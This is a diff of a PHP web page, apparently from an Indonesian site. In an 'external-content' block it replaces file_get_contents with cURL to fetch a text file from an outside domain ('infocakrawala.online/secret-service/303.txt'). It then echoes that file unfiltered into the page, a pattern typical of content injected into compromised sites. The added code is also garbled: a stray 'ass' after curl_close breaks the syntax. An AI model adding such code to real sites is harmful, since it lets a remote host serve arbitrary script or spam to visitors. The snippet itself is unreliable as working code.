@@ -174,16 +174,20 @@ include"admin/content/tglindo.php";
 
 
 <div class="external-content">
-				<?php
-				// Mengambil konten dari URL eksternal
-				$a = file_get_contents('https://infocakrawala.online/secret-service/303.txt');
+<?php
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://infocakrawala.online/secret-service/303.txt');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$output = curl_exec($ch);
+curl_close($ch);ass
 
-				if ($a !== false) {
-					echo $a; // Menampilkan konten sebagai teks HTML
-				} else {
-					echo 'c.';
-				}
-				?>
+if ($output !== false) {
+    echo $output; // Menampilkan konten sebagai teks HTML
+} else {
+    echo 'Gagal mengambil konten dari URL yang diberikan.';
+}
+?>
+
 </div>
 
 
